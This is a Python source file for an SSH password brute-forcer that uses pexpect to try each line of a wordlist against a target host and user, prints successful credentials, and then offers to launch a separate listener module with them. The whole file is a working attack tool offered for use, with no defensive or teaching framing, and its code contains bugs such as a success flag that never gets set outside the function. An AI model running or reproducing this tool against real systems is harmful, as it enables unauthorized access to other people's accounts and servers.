import time
import sys
import os
from pexpect import pxssh
import argparse
import threading

method = 'ssh'
O = '\033[33m'
E = '\033[0m'
F = '\033[91m'
B = '\033[94m'
G = '\033[92m'
password_true = ''
parser = argparse.ArgumentParser()
parser.add_argument('host', help='Target host')
parser.add_argument('user', help='Target username')
parser.add_argument('password', help='Target password file')
args = parser.parse_args()

if args.host and args.user and args.password:
	HOST = args.host
	USER = args.user
	
	try:
		PASSWORD = open(args.password, 'r')
		print(O+'[*]'+E+' Open file password'+E)
	except:
		print(F+'[--] File not found'+E)
		exit(0)
else:
	print('Error ! Check monual programm')
	exit(0)


def brut():
	print(G+'Start brut SSH')
	for line in PASSWORD:
		password = line.strip('\r\n')
		s = pxssh.pxssh()
		try:
			s.login(HOST, USER, password)
			print(O+time.ctime()+' '+G+'SSH connect user->'+B+USER+G+' paswword-> '+B+password+E)
			password_true = password
			break
		except:
			#print(error)
			print(O+time.ctime()+' '+E+'Not work user-> '+B+USER+E+' paswword-> '+B+password+E)
	if password_true == '':
		print(G+' Not open sesssion')
		sys.exit(1)
	print(F+'Open session!!'+E)
	print('Start HunListener ??')
	y = input('Y/n>')
	if y == 'Y' or y == 'y':
		os.chdir('modules/')
		comand = 'python hun_listener.py '+ HOST +' '+USER+' '+' '+password_true+' '+method
		os.system(comand)
	else:
		sys.exit(1)
t1 = threading.Thread(target=brut)
t1.start()